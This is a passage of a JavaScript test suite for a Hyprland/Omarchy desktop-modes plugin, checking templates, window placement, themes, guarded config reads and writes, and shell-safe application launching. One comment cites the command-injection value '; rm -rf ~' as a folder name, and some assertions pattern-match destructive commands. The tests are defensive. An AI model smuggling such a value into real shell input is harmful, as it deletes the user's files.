  const captured = Model.captureMode({})
  assert.equal(captured.name, "Current desktop")
  assert.deepEqual(captured.applications, [])
  assert.equal(captured.notifications.dnd, null)
  assert.equal(captured.workspaces.target, null)
  // Whatever comes out has to survive the same normalization as anything else.
  assert.ok(Model.normalizeMode(captured, []))
})

test("the shipped icon set is non-empty and free of tofu-prone entries", () => {
  const icons = JSON.parse(read("icons.json"))
  assert.ok(icons.length > 50, "expected a usable number of glyphs")
  for (const icon of icons) {
    assert.equal(typeof icon.g, "string")
    assert.ok(icon.g.length > 0 && icon.g.length <= 2, "glyph should be one character")
    assert.ok(String(icon.k).length > 0, "every glyph needs search keywords")
    const point = icon.g.codePointAt(0)
    const privateUse = (point >= 0xe000 && point <= 0xf8ff) || (point >= 0xf0000 && point <= 0xffffd)
    assert.ok(privateUse, "glyphs must be Nerd Font private-use, not arbitrary unicode")
  }
})

// --------------------------------------------------------------- templates

test("every template produces a valid mode", () => {
  for (const template of Model.templates()) {
    const ctx = Model.templateMode(template.key, [])
    assert.ok(ctx, template.key + " should produce a mode")
    assert.ok(Model.isValidId(ctx.id), template.key + " id should be machine safe")
    assert.equal(ctx.name, template.name)
  }
  assert.equal(Model.templateMode("nope", []), null)
})

test("no example modes ship: blank is the only template", () => {
  assert.deepEqual(Model.templates().map((t) => t.key), ["blank"])
  const source = read("EditorWindow.qml")
  for (const name of ["Coding", "Gaming", "Deep Work", "Presentation"])
    assert.ok(!source.includes('"' + name + '"'), name + " should not be offered as a template")
})

test("the bar mark is drawn in the theme's colour, not loaded as an image", () => {
  const mark = read("ModesMark.qml")
  // Drawn, whatever it is drawn out of — Rectangles today, a Shape before
  // that. What matters is that no pixels are loaded and the colour comes from
  // the theme, not which primitive happens to be enough for the shape.
  assert.doesNotMatch(mark, /\bImage\s*\{/, "the mark must not load an image")
  assert.doesNotMatch(mark, /\.(png|svg|jpg)/i, "the mark must not name an image file")
  assert.match(mark, /property color color: Color\.foreground/)
  const bar = read("BarWidget.qml")
  assert.match(bar, /ModesMark \{/)
  assert.match(bar, /color: root\.foreground/)
  // A PNG in the bar cannot follow the theme; the logo belongs in the README.
  assert.ok(!/assets\/wsmodes\.png/.test(bar), "the bar should not load the logo image")
})

test("nothing user-visible still says context", () => {
  for (const file of ["README.md", "manifest.json", "BarWidget.qml", "EditorWindow.qml",
    "ModeForm.qml", "ModeRow.qml", "Service.qml", "bin/wsmodes"]) {
    const source = read(file)
    // The one allowed mention is reading the old config file by its old name.
    const hits = source.split("\n").filter((line) => /\bcontexts?\b/i.test(line))
    assert.deepEqual(hits, [], file + " still says context")
  }
})

// --------------------------------------------------------- window placement

test("the landing workspace is focused after the applications, not before", () => {
  const cfg = Model.parseConfig(JSON.stringify({
    version: 1,
    modes: [{ id: "c", name: "C", workspaces: { target: 1 },
      applications: [{ desktopId: "chromium", workspace: 2, enabled: true }],
      commands: { onActivate: ["echo hi"], onDeactivate: [] } }]
  })).config
  const kinds = Model.activationPlan(cfg.modes[0], { launchApps: true }).map((s) => s.kind)
  // A window that lands on the wrong workspace takes focus with it, so the
  // focus has to come last or the mode leaves you somewhere else.
  assert.equal(kinds[kinds.length - 1], "workspace")
  assert.ok(kinds.indexOf("applications") < kinds.indexOf("workspace"))
  assert.ok(kinds.indexOf("commands") < kinds.indexOf("workspace"))
})

test("a settings-only pass still focuses the landing workspace", () => {
  const cfg = Model.parseConfig(JSON.stringify({
    version: 1,
    modes: [{ id: "c", name: "C", workspaces: { target: 3 },
      applications: [{ desktopId: "chromium", workspace: 2, enabled: true }] }]
  })).config
  const plan = Model.activationPlan(cfg.modes[0], { settingsOnly: true })
  assert.deepEqual(plan.map((s) => s.kind), ["workspace"])
  assert.equal(plan[0].value, 3)
})

test("placement keys cover the reverse-dns and plain forms of an app", () => {
  assert.deepEqual(Model.placementKeys("chromium", "", ""), ["chromium"])
  assert.deepEqual(Model.placementKeys("com.mitchellh.ghostty", "", ""),
    ["com.mitchellh.ghostty", "ghostty"])
  // Two-letter noise would match half the desktop, so it is dropped.
  assert.deepEqual(Model.placementKeys("", "vi", ""), [])
})

test("a window is matched to the launch that was waiting for it", () => {
  const now = Date.now()
  const pending = [{ keys: Model.placementKeys("chromium", "", ""), workspace: "2", at: now }]
  assert.equal(Model.matchPlacement(pending, "chromium", now), 0)
  assert.equal(Model.matchPlacement(pending, "org.chromium.Chromium", now), 0)
  assert.equal(Model.matchPlacement(pending, "firefox", now), -1)
})

test("a launch that never produced a window stops being waited on", () => {
  const now = Date.now()
  const stale = now - Model.PLACEMENT_TTL_MS - 1
  const pending = [{ keys: ["chromium"], workspace: "2", at: stale }]
  assert.equal(Model.matchPlacement(pending, "chromium", now), -1)
  assert.deepEqual(Model.prunePlacements(pending, now), [])
  assert.equal(Model.prunePlacements([{ keys: ["chromium"], workspace: "2", at: now }], now).length, 1)
})

test("a stray window is moved without dragging focus with it", () => {
  const service = read("Service.qml")
  // follow = false is what keeps focus put; silent = true is not a real field.
  assert.match(service, /follow = false/)
  assert.match(service, /function handleWindowPlacement/)
  // Placement is not a trigger, so it must not be gated on triggersEnabled.
  const blocks = service.split("Connections {")
  const placement = blocks.find((b) => b.includes("handleWindowPlacement"))
  assert.ok(placement && !placement.includes("triggersEnabled"),
    "placement must work with triggers off")
})

// ------------------------------------------------------------------ glyphs

test("every icon in the UI comes from the shared glyph map", () => {
  const files = ["EditorWindow.qml", "ModeForm.qml", "ModeRow.qml", "BarWidget.qml",
    "AppPicker.qml", "IconPicker.qml", "ThemePicker.qml"]
  // The ad-hoc mix this replaced: wide plus, arrows, ticks, gears, triangles.
  const strays = /[\uff0b\u2913\u2715\u25b2\u25bc\u2713\u21bb\u25b8\u25be\u2699\u23fb]/
  for (const file of files) {
    const source = read(file)
    assert.ok(!strays.test(source), file + " still has a hand-picked symbol")
    if (/iconText:|Glyph\./.test(source))
      assert.match(source, /import "Model\.js" as Model/, file + " uses Glyph without importing Model")
  }
})

test("the glyph map is Nerd Font private-use only, one codepoint each", () => {
  const keys = Object.keys(Model.Glyph)
  assert.ok(keys.length > 10)
  const seen = new Set()
  for (const key of keys) {
    const glyph = Model.Glyph[key]
    assert.equal(Array.from(glyph).length, 1, key + " should be a single glyph")
    const cp = glyph.codePointAt(0)
    assert.ok(cp >= 0xe000 && cp <= 0xfffff, key + " should be private-use")
    assert.ok(!seen.has(cp), key + " duplicates another glyph")
    seen.add(cp)
  }
})

test("icons render at the icon size, never at a body size", () => {
  for (const file of ["ModeRow.qml", "ThemePicker.qml"]) {
    const source = read(file)
    const blocks = source.split(/\n\s*\n/).filter((b) => b.includes("Glyph."))
    for (const block of blocks)
      assert.ok(!/font\.pixelSize: Style\.font\.body/.test(block), file + " sizes a glyph as body text")
  }
})

// ----------------------------------------------------------------- themes

test("a theme is stored as the slug Omarchy writes, shown as a readable name", () => {
  assert.equal(Model.prettyThemeName("rose-pine-dark"), "Rose Pine Dark")
  assert.equal(Model.prettyThemeName("gruvbox"), "Gruvbox")
  assert.equal(Model.prettyThemeName(""), "")
})

test("the theme list drops blanks and duplicates, and sorts by name", () => {
  const list = Model.themeList(["tokyo-night", "", "gruvbox", "gruvbox", "  "])
  assert.deepEqual(list.map((t) => t.slug), ["gruvbox", "tokyo-night"])
  assert.equal(list[0].name, "Gruvbox")
})

test("theme search matches both the slug and the readable name", () => {
  const list = Model.themeList(["rose-pine-dark", "gruvbox"])
  assert.deepEqual(Model.filterThemes(list, "rose").map((t) => t.slug), ["rose-pine-dark"])
  assert.deepEqual(Model.filterThemes(list, "Pine Dark").map((t) => t.slug), ["rose-pine-dark"])
  assert.equal(Model.filterThemes(list, "").length, 2)
})

test("the theme picker reads the installed themes, it does not hardcode any", () => {
  const picker = read("ThemePicker.qml")
  assert.match(picker, /service\.themes/)
  assert.match(picker, /service\.refreshThemes\(\)/)
  assert.match(read("Service.qml"), /function refreshThemes\(\)/)
  // Both the shipped and the user theme directory, or user themes go missing.
  assert.match(read("Service.qml"), /OMARCHY_PATH\/themes.*\n.*|\$HOME\/\.config\/omarchy\/themes/)
  assert.match(read("ModeForm.qml"), /openThemePicker\(\)/)
})

// ------------------------------------------------------- switching windows

test("the window question is only asked when there is something to close", () => {
  assert.equal(Model.windowSwitchMode({}, undefined, true), "ask")
  assert.equal(Model.windowSwitchMode({}, undefined, false), "keep")
  assert.equal(Model.windowSwitchMode({ confirmWindowsOnSwitch: false }, undefined, true), "keep")
})

test("an explicit choice always wins over the setting", () => {
  for (const mode of ["close", "keep"]) {
    assert.equal(Model.windowSwitchMode({}, mode, true), mode)
    assert.equal(Model.windowSwitchMode({ confirmWindowsOnSwitch: false }, mode, true), mode)
  }
  assert.equal(Model.windowSwitchMode({}, "nonsense", true), "ask")
})

test("the prompt says how many windows are at stake", () => {
  assert.match(Model.switchPromptMessage("Coding", 1), /1 window is open/)
  assert.match(Model.switchPromptMessage("Coding", 4), /4 windows are open/)
  assert.match(Model.switchPromptMessage("Coding", 0), /"Coding"/)
})

test("windows are closed gracefully, never killed", () => {
  const service = read("Service.qml")
  assert.match(service, /hl\.dsp\.window\.close/)
  assert.ok(!/killwindow|forcekill|SIGKILL/.test(service), "no forced kill path")
  // The close happens after the snapshot, so a restore still has something to restore.
  assert.ok(service.indexOf("captureSnapshot(ctx)") < service.indexOf("pending.closeWindows"))
})

test("automatic and scripted switches never wait on the dialog", () => {
  const service = read("Service.qml")
  assert.match(service, /activateMode\(ctx\.id, \{ windows: "keep" \}\)/)
  assert.match(service, /function activateWindows\(id: string, mode: string\)/)
  assert.match(read("bin/wsmodes"), /--close\) result=\$\(call activateWindows/)
})

test("settings expose the window question", () => {
  assert.equal(Model.defaultConfig().behavior.confirmWindowsOnSwitch, true)
  assert.match(read("EditorWindow.qml"), /key: "confirmWindowsOnSwitch"/)
})

test("nothing is created without being asked for: defaults ship zero modes", () => {
  assert.deepEqual(Model.defaultConfig().modes, [])
  assert.equal(Model.defaultConfig().behavior.triggersEnabled, false)
  assert.equal(Model.defaultConfig().behavior.restoreOnStart, false)
  assert.equal(Model.defaultConfig().behavior.confirmAutomaticSwitch, true)
})

// ------------------------------------------------------- shipped artifacts

test("the manifest matches what the shell's registry enforces", () => {
  const manifest = JSON.parse(read("manifest.json"))
  assert.equal(manifest.schemaVersion, 1)
  for (const field of ["id", "name", "version", "kinds", "entryPoints"])
    assert.ok(manifest[field] !== undefined, "missing " + field)
  assert.ok(!manifest.id.startsWith("omarchy."), "omarchy.* is a reserved namespace")
  assert.match(manifest.id, /^[A-Za-z0-9][A-Za-z0-9._-]*$/)
  assert.ok(["left", "center", "right"].includes(manifest.barWidget.defaultSection))
  for (const [kind, key] of [["bar-widget", "barWidget"], ["service", "service"]]) {
    assert.ok(manifest.kinds.includes(kind))
    const entry = manifest.entryPoints[key]
    assert.ok(entry && !entry.startsWith("/") && !entry.includes(".."), key + " must be a safe relative path")
    assert.ok(fs.existsSync(path.join(root, entry)), entry + " must exist")
  }
})

test("the bar widget exposes the three names the shell's summon routing calls", () => {
  const qml = read("BarWidget.qml")
  assert.match(qml, /property bool opened:/)
  assert.match(qml, /function open\(\)/)
  assert.match(qml, /function close\(\)/)
})

test("the service registers the IPC target the CLI talks to", () => {
  const qml = read("Service.qml")
  assert.match(qml, /target: "wsmodes"/)
  for (const method of ["list", "current", "activate", "deactivate", "reload", "manage", "edit", "capture"])
    assert.match(qml, new RegExp("function " + method + "\\("), "missing IPC method " + method)
})

test("the editor stands down while an external chooser is up, and always comes back", () => {
  const qml = read("EditorWindow.qml")
  assert.match(qml, /visible: root\.opened && !root\.suspended/)
  assert.match(qml, /root\.suspended = true/)
  const finished = qml.slice(qml.indexOf("function chooserFinished"))
  assert.ok(finished.indexOf("root.resume()") < finished.indexOf("chooserError.trim()"),
    "chooserFinished must resume before it reports")
})

test("no route out of a half-finished edit skips the unsaved guard", () => {
  const qml = read("EditorWindow.qml")
  for (const route of ["requestClose", "requestSelect", "requestPane", "requestCreateMode"])
    assert.match(qml, new RegExp("function " + route + "\\("), "missing guarded route " + route)
  // The scrim, Escape, the close button and the sidebar all go through them.
  assert.doesNotMatch(qml, /onClicked: root\.close\(\)/)
  assert.match(qml, /onClicked: root\.requestClose\(\)/)
  // The chip's click branches now — the mode already open opens its icon
  // picker instead — so pin the guarded route, not the shape of the handler.
  assert.match(qml, /root\.requestSelect\(modelData\.id\)/)
  // A field still under the caret has uncommitted text; guard() takes focus
  // back first so those changes are seen.
  const guard = qml.slice(qml.indexOf("function guard("))
  assert.ok(guard.indexOf("keyCatcher.forceActiveFocus()") < guard.indexOf("guardResolved"),
    "guard must commit the focused field before deciding")
})

test("the editor is reachable and operable from the keyboard", () => {
  const qml = read("EditorWindow.qml")
  assert.match(qml, /Keys\.onTabPressed/)
  assert.match(qml, /Qt\.Key_S/)
  assert.match(qml, /Qt\.Key_N/)
  assert.match(qml, /Qt\.Key_D/)
  assert.match(qml, /Qt\.AltModifier/)
  assert.match(read("ModeForm.qml"), /function focusFirstField/)
})

test("activating a mode is visible in the bar and cannot be double-fired", () => {
  const qml = read("BarWidget.qml")
  assert.match(qml, /service\.activating\) return/)
  assert.match(qml, /root\.activating/)
})

test("the app picker reads the shell's own application library", () => {
  const qml = read("AppPicker.qml")
  assert.match(qml, /appLibrary\.sortedEntries\(query\)/)
  assert.match(qml, /service\.appLibrary/)
  const service = read("Service.qml")
  assert.match(service, /shell\.appLibrary/)
  assert.match(service, /function launchDesktopEntry/)
})

test("application launches never hand a user string to a shell for parsing", () => {
  const qml = read("Service.qml")
  assert.match(qml, /exec "\$@"/)
  assert.doesNotMatch(qml, /execDetached\(\["bash", "-lc", parsed/)
})

test("a folder reaches the shell as an argument, never spliced into the script", () => {
  const qml = read("Service.qml")
  const body = fnBody(qml, "function execDetachedIn(argv, directory)")
  // The script is one of two constants. The folder rides in the argv, where
  // `cd -- "$1"` cannot read a name like `; rm -rf ~` as anything but a name.
  assert.match(body, /cd -- "\$1" \|\| exit 1; shift; exec "\$@"/)
  assert.doesNotMatch(body, /"-lc", *[a-z_]*\+/)
  assert.match(body, /\.concat\(extra, argv\)/)

  // The workspace path has no argv to ride in, so every word is quoted
  // instead — including the folder.
  const line = fnBody(qml, "function shellLineFor(argv, directory)")
  assert.match(line, /Util\.shellQuote\(argv\[i\]\)/)
  assert.match(line, /"cd -- " \+ Util\.shellQuote\(directory\)/)
})

test("arguments and a folder are the reason to bypass gtk-launch, not to skip it", () => {
  const body = fnBody(read("Service.qml"), "function launchDesktopEntry(desktopId, args, directory, workspace)")
  // With neither, nothing changes: the launch still goes through the app
  // daemon, which is what puts it in its own systemd scope.
  assert.match(body, /if \(extra\.argv\.length > 0 \|\| dir !== ""\)/)
  assert.match(body, /uwsm-app/)
  assert.match(body, /gtk-launch/)
  // An unbalanced quote is refused rather than guessed at.
  assert.match(body, /extra\.unterminated/)
})

test("capture asks Hyprland what is open before deciding what is open", () => {
  const qml = read("Service.qml")
  const body = fnBody(qml, "function captureCurrentSetup(name)")
  // A window opened since the last event Quickshell saw has an empty
  // lastIpcObject, and openWindows drops a window with no class. Without this
  // the terminal you just opened is the one thing a capture leaves out.
  assert.match(body, /Hyprland\.refreshToplevels\(\)/)
  assert.match(body, /captureRefresh\.restart\(\)/)
  // The window list is read after the refresh, not before it.
  assert.doesNotMatch(body, /openWindows\(\)/)
  assert.match(fnBody(qml, "function beginCaptureProbe()"), /service\.captureWindows = openWindows\(\)/)
  // And a second capture cannot start while the first is still waiting.
  assert.match(body, /captureProcess\.running \|\| captureRefresh\.running/)
})

test("modes written under the old name are adopted once, and never resurrected", () => {
  const qml = read("Service.qml")
  assert.match(qml, /legacyConfigPath: home \+ "\/\.config\/omarchy\/omara\.json"/)

  const load = fnBody(qml, "function loadConfigFromDisk()")
  // Only on a first load that found nothing, and only once: after you have
  // deleted every mode, the old file must not bring them back on the poll.
  assert.match(load, /verdict === "absent" && !service\.configLoaded && !service\.legacyChecked/)
  assert.match(load, /service\.legacyChecked = true/)

  const adopt = fnBody(qml, "function adoptLegacyConfig()")
  // Read, load, save under the new name. Nothing is moved or deleted, so the
  // old file is still there if this was the wrong call.
  assert.match(adopt, /service\.loadConfig\(text\)/)
  assert.match(adopt, /service\.save\(\)/)
  assert.doesNotMatch(adopt, /\brm\b|unlink|mv /)
  // lastWrittenText is cleared first, or the save decides it is already done.
  assert.match(adopt, /service\.lastWrittenText = ""[\s\S]*?service\.save\(\)/)
})

test("a mode is renamed where its icon is chosen, and nowhere else", () => {
  const picker = read("IconPicker.qml")
  assert.match(picker, /id: nameField/)
  assert.match(picker, /setDraft\("name", nameField\.text\)/)

  // A TextField commits on editingFinished, which a hidden overlay never
  // reaches, so every exit commits the name first.
  const commit = fnBody(picker, "function commitName()")
  assert.match(commit, /root\.editor\.setDraft/)
  for (const exit of ["root.cleared()", "root.dismissed()", "root.chosen(String(modelData.g))"])
    assert.ok(picker.includes("root.commitName(); " + exit),
      `${exit} should commit the name on the way out`)

  // The options form routes to the same overlay instead of holding a second
  // name field that could disagree with it.
  const form = read("ModeForm.qml")
  assert.doesNotMatch(form, /placeholderText: "Name"/)
  assert.match(form, /id: identityField/)
  assert.match(fnBody(form, "function focusFirstField()"), /identityField/)
})

test("a terminal is asked what to run, not what flag to pass", () => {
  // A whole shell line goes in and comes back out unchanged, quotes included.
  for (const line of [
    "cd projects/project1 && claude",
    "echo 'hi there' && claude",
    'cd "My Notes" && vim',
    "a && b || c; d | e"
  ]) {
    const stored = Model.setTerminalCommand("", line)
    assert.equal(Model.terminalCommandOf(stored), line, `round trip: ${line}`)
    // And it is one argument to the shell, never syntax in our own string.
    const argv = Model.parseArgv(stored).argv
    assert.deepEqual(argv.slice(0, 3), ["-e", "bash", "-lc"])
    assert.equal(argv[3], line)
    assert.equal(argv.length, 4)
  }

  // Flags that came before the command are not the command, and survive.
  assert.equal(Model.setTerminalCommand("--title notes -e btop", "cd x && y"),
    "--title notes -e bash -lc 'cd x && y'")
  // Clearing the command clears the flag with it, rather than leaving a bare -e.
  assert.equal(Model.setTerminalCommand("-e bash -lc 'cd a && b'", ""), "")
  assert.equal(Model.setTerminalCommand("--title notes -e btop", ""), "--title notes")
  // A newline would end up in a shell command line.
  assert.equal(Model.setTerminalCommand("", "a\nb").indexOf("\n"), -1)

  // A mode written by hand, or a capture, is shown as it stands.
  assert.equal(Model.terminalCommandOf("-e btop --tree"), "btop --tree")
  assert.equal(Model.terminalCommandOf(""), "")
  assert.equal(Model.terminalCommandOf("--class foo"), "")
  // A whole word, so neither of these is the flag.
  assert.equal(Model.terminalCommandOf("--exec-ish btop"), "")
  assert.equal(Model.terminalCommandOf("/opt/thing-e btop"), "")

  // The .desktop file declares it; we do not guess from the name.
  assert.equal(Model.isTerminalCategories(["System", "TerminalEmulator"]), true)
  assert.equal(Model.isTerminalCategories(["Network", "WebBrowser"]), false)
  assert.equal(Model.isTerminalCategories(undefined), false)
  // QML hands a list<QString> over as something array-like that is not a JS
  // Array. Guarding with Array.isArray said no to every real desktop entry
  // while every plain-array test above still passed.
  assert.equal(Model.isTerminalCategories({ length: 2, 0: "System", 1: "TerminalEmulator" }), true)
  assert.equal(Model.isTerminalCategories({ length: 1, 0: "WebBrowser" }), false)

  const editor = read("EditorWindow.qml")
  assert.match(fnBody(editor, "function applicationIsTerminal(app)"),
    /Model\.isTerminalCategories\(entry\.categories\)/)

  const canvas = read("WorkspaceCanvas.qml")
  // One box for a terminal: no flag to know, no folder to fill in separately.
  assert.match(canvas, /placeholderText: "Command, e\.g\. cd projects\/app && claude"/)
  assert.match(canvas, /visible: pane\.editing && pane\.terminal/)
  // And no boxes at all for anything else. A browser names an application and
  // that is the whole answer, so it is asked nothing.
  assert.doesNotMatch(canvas, /!pane\.terminal/)
  assert.doesNotMatch(canvas, /placeholderText: "Folder/)
  assert.doesNotMatch(canvas, /placeholderText: pane\.app && pane\.app\.desktopId/)
  // Editing hides the icon, so a pane with nothing to show must never enter it.
  assert.match(canvas, /readonly property bool hasFields: app !== null\s*\n\s*&& \(terminal \|\| !app\.desktopId\)/)
  assert.match(canvas, /editing: chosen && hasFields && roomForFields/)
  assert.match(canvas, /hinting: hasFields && !editing/)
  // Same stored field either way: a terminal is a different question, not a
  // different schema.
  assert.match(canvas, /setApplicationField\(pane\.modelData\.app, "args"/)
  // The pane shows the line, not the wrapping we put around it.
  assert.match(canvas, /detail: terminal[\s\S]{0,80}Model\.terminalCommandOf\(app\.args\)/)
})

test("the board's mouse area cannot swallow a click meant for a pane's box", () => {
  const canvas = read("WorkspaceCanvas.qml")
  // Later siblings are on top and are offered the press first. boardMouse
  // fills the whole board, so declared after the panes it covers every input
  // inside one: the command box rendered, and could never be clicked.
  //
  // A pane is a Rectangle and does not consume a press, so clicks on a pane's
  // background still reach boardMouse from below.
  const mouse = canvas.indexOf("id: boardMouse")
  const panes = canvas.indexOf("// ------------------------------------------------------- panes")
  assert.ok(mouse !== -1 && panes !== -1, "expected both boardMouse and the panes block")
  assert.ok(mouse < panes,
    "boardMouse must be declared before the panes, or it covers their inputs")

  // The dividers and the pane controls still sit above it, as before.
  for (const later of ["---- dividers", "------ pane controls"])
    assert.ok(canvas.indexOf(later) > mouse, `${later} should stay above boardMouse`)
})

test("a pane says what it runs, and lets you say it", () => {
  const canvas = read("WorkspaceCanvas.qml")
  // The detail line is the only thing telling two Foots apart on a board.
  assert.match(canvas, /Model\.applicationDetail\(app\)/)

  // A pane with no arguments and no folder is indistinguishable from a pane
  // that takes neither, so hovering one offers what picking it would give.
  assert.match(canvas, /readonly property bool hinting: hasFields && !editing && detail === ""/)
  assert.match(canvas, /canvas\.pointerPath === modelData\.path/)
  // And the hint names the field the pane will actually offer.
  assert.match(canvas, /pane\.hinting \? "command" : ""/)
  // Never promised on a pane too small to take it up.
  assert.match(canvas, /hinting:[\s\S]{0,120}roomForFields/)
  // Inputs only once a pane is picked and only where a field fits, so a board
  // of panes stays a board of names.
  assert.match(canvas, /editing: chosen && hasFields && roomForFields/)
  for (const field of ["command", "args"])
    assert.match(canvas, new RegExp(`setApplicationField\\(pane\\.modelData\\.app, "${field}"`))
})

test("probe output is bounded and cannot inherit from Object.prototype", () => {
  const probe = Model.parseProbeOutput(
    "WALLPAPER\t/home/a/bg.jpg\nTHEME\tgruvbox\nAPP\tmissing\tsteam\nAPP\tok\tghostty\n")
  assert.equal(probe.wallpaper, "/home/a/bg.jpg")
  assert.equal(probe.theme, "gruvbox")
  assert.equal(probe.missing.steam, true)
  assert.equal(probe.missing.ghostty, undefined)

  // The lookup is `missing[name] === true`, so a command sharing a name with
  // something on Object.prototype must not come back truthy.
  assert.equal(probe.missing.toString, undefined)
  assert.equal(probe.missing.constructor, undefined)
  assert.equal(probe.missing.hasOwnProperty, undefined)
  assert.equal(Object.getPrototypeOf(probe.missing), null)

  // A producer that ignores its own ceilings does not get to set ours.
  const flood = Array.from({ length: 5000 }, (_, i) => `APP\tmissing\tapp${i}`).join("\n")
  assert.ok(Object.keys(Model.parseProbeOutput(flood).missing).length <= 512)
  const huge = Model.parseProbeOutput("WALLPAPER\t" + "x".repeat(200000))
  assert.ok(huge.wallpaper.length <= 4096)

  // A closed record: four known keys, whatever the output says.
  assert.deepEqual(Object.keys(Model.parseProbeOutput("EVIL\tx\nWALLPAPER\ta")).sort(),
    ["missing", "processes", "theme", "wallpaper"])
})

test("a guarded read reports a closed set of verdicts, and caps the body", () => {
  const ok = Model.parseFileResult("RESULT\tok\t\n{\"modes\":[]}", 4194304)
  assert.equal(ok.verdict, "ok")
  assert.equal(ok.content, '{"modes":[]}')

  const refused = Model.parseFileResult("RESULT\trefuse\tit is not a regular file (found: fifo)\n", 4194304)
  assert.equal(refused.verdict, "refuse")
  assert.match(refused.detail, /fifo/)
  assert.equal(refused.content, "")

  assert.equal(Model.parseFileResult("RESULT\tabsent\t\n", 4194304).verdict, "absent")

  // A verdict the helper cannot emit, or no verdict line at all, is refused by
  // the caller rather than read as success.
  assert.equal(Model.parseFileResult("RESULT\tapproved\t\n", 4194304).verdict, "")
  assert.equal(Model.parseFileResult("garbage without a newline", 4194304).verdict, "")
  assert.equal(Model.parseFileResult("", 4194304).verdict, "")

  // The parser applies the ceiling itself, whatever the producer sent.
  assert.equal(Model.parseFileResult("RESULT\tok\t\n" + "x".repeat(5000), 1024).content.length, 1024)
})

test("a theme directory cannot vanish by sharing a name with a prototype key", () => {
  const themes = Model.themeList(["gruvbox", "constructor", "toString", "gruvbox"])
  assert.deepEqual(themes.map(t => t.slug).sort(), ["constructor", "gruvbox", "toString"])
  assert.ok(Model.themeList(Array.from({ length: 5000 }, (_, i) => "t" + i)).length <= 512)
})

test("the import pane shows the lines it would run before anything is imported", () => {
  const qml = read("EditorWindow.qml")
  assert.match(qml, /Model\.importPreview/)
  assert.match(qml, /modelData\.runs/)
  assert.match(qml, /root\.importDisarmed/)
  // Nothing is applied until a button is pressed.
  assert.match(qml, /function confirmImport/)
})

test("an activation reports what happened, not what it asked for", () => {
  const qml = read("Service.qml")
  // Steps carry a token and are logged at the verdict, never optimistically.
  assert.match(qml, /function runSupervised\(argv, label, blocking\)/)
  assert.match(qml, /if \(!result\.run\) log\(result\.ok \? "info" : "warn", result\.detail\)/)
  assert.match(qml, /function finishJob/)
  // activating comes down at the verdict, and every exit path releases it.
  assert.match(qml, /function abandonActivation/)
  assert.match(qml, /id: awaitSweep/)
  // Deactivation restores settings through the same functions, so it waits too.
  assert.match(qml, /function deactivateMode[\s\S]*?awaitRuns\(results, function/)
  for (const fn of ["setTheme", "setWallpaper", "setDnd"])
    assert.match(qml, new RegExp(`function ${fn}[\\s\\S]*?run: run`), `${fn} drops its verdict`)

  // State-changing actions are serialised so an older one cannot land last.
  assert.match(qml, /function pumpActions/)
  assert.match(qml, /function releaseRun/)
  assert.match(qml, /planGeneration/)

  // Reporting a verdict must not hand back the queue slot. The record is both
  // the verdict and the lifecycle slot, so only the second of exit-and-report
  // may drop it — otherwise the sweep sees a missing record, frees the slot,
  // and starts the next mutation while the first process is still running.
  // Stopping the wait must not destroy the owner of a still-running process:
  // that would terminate the action the deadline exists not to kill.
  const reportBody = fnBody(qml, "function report(code)")
  assert.ok(reportBody.length > 0, "report() not found")
  assert.doesNotMatch(reportBody, /destroy\(\)/)
  assert.match(qml, /onExited: function\(exitCode\) \{[\s\S]*?run\.destroy\(\)/)
  assert.match(qml, /onTriggered: run\.report\(124\)/)
  // Teardown is explicit rather than implicit destruction.
  assert.match(fnBody(qml, "function terminate()"), /proc\.signal\(15\)/)
  assert.match(qml, /if \(proc\.running\) proc\.signal\(9\)/)

  const finishBody = fnBody(qml, "function finishJob(job)")
  assert.ok(finishBody.length > 0, "finishJob not found")
  assert.match(finishBody, /rec\.reported = true[\s\S]*?if \(rec\.exited\) delete/)
  assert.match(fnBody(qml, "function releaseRun(id)"), /rec\.exited = true[\s\S]*?if \(rec\.reported\) delete/)
  // The queue slot is only ever freed on a real exit, never on a report.
  assert.doesNotMatch(fnBody(qml, "function sweepActions()"), /\breport\(/)
  assert.match(fnBody(qml, "function releaseRun(id)"), /service\.activeAction = 0/)

  // Publications are serialised per target, newest content winning.
  assert.match(qml, /function pumpWrites/)
  assert.match(qml, /q\.running = true/)
  assert.match(qml, /superseded/)
})

test("only the processes that must outlive the shell stay detached", () => {
  const qml = read("Service.qml")
  const detached = qml.match(/Quickshell\.execDetached\(/g) || []
  // Exactly two: the raw application launch, where `exec "$@"` becomes the
  // application, and the documented onActivate/onDeactivate hook.
  assert.equal(detached.length, 2)
  assert.match(qml, /function runCommand[\s\S]*?Quickshell\.execDetached\(\["bash", "-lc", c\]\)/)
  // The editor writes and reads through the service's guarded helpers, so the
  // export cannot log success blind and an imported path is not trusted just
  // because a file chooser produced it.
  const editor = read("EditorWindow.qml")
  assert.doesNotMatch(editor, /Quickshell\.execDetached/)
  assert.doesNotMatch(editor, /FileView\s*\{/)
  assert.match(editor, /service\.writeGuarded\(/)
  assert.match(editor, /service\.readGuarded\(/)
})

test("the config read carries its own guarantees instead of checking first", () => {
  const qml = read("Service.qml")
  // Checking a pathname and then handing the same name to FileView is
  // check-then-use. The open itself has to be the thing that refuses.
  assert.doesNotMatch(qml, /FileView\s*\{/)
  assert.match(qml, /iflag=nofollow,nonblock/)
  assert.match(qml, /count=\$\(\(limit \/ 4096\)\)/)
  assert.match(qml, /function readGuarded/)
  // Writes publish through a fresh 0600 temp and a rename, so a symlink or a
  // FIFO at the target is replaced rather than written through.
  assert.match(qml, /umask 077/)
  assert.match(qml, /mktemp "\$dir\/\.wsmodes\.XXXXXX"/)
  assert.match(qml, /mv -f -- "\$tmp" "\$target"/)
  // An incomplete check refuses; a guard that can be removed by breaking it
  // is not a guard.
  assert.match(qml, /the check did not complete/)
  assert.match(qml, /configReadOnly/)
  // The recovery copy still writes the bytes that were read.
  assert.doesNotMatch(qml, /cp -f --/)
  assert.match(qml, /function backupBrokenConfig\(raw\)/)
})

test("the tools that enforce the boundaries are not resolved through PATH", () => {
  const qml = read("Service.qml")
  assert.match(qml, /binTimeout: "\/usr\/bin\/timeout"/)
  assert.match(qml, /binBash: "\/usr\/bin\/bash"/)
  assert.match(qml, /safePath: "PATH=\/usr\/bin:\/bin/)
  // Guard, reader, writer and theme scan all run without the user's profile.
  assert.doesNotMatch(qml, /bounded\([^)]*\[\s*"bash"/)
  // The two intentional exceptions are the user's own launches and hooks,
  // which are supposed to run in the user's own environment.
  const detached = qml.match(/Quickshell\.execDetached\(\["bash", "-lc"/g) || []
  assert.equal(detached.length, 2)
})

test("every workspace dispatch is built from a validated reference", () => {
  const qml = read("Service.qml")
  // No dispatch site may interpolate a raw workspace: each one goes through
  // Model.workspaceRef first, and the Lua path quotes what it gets.
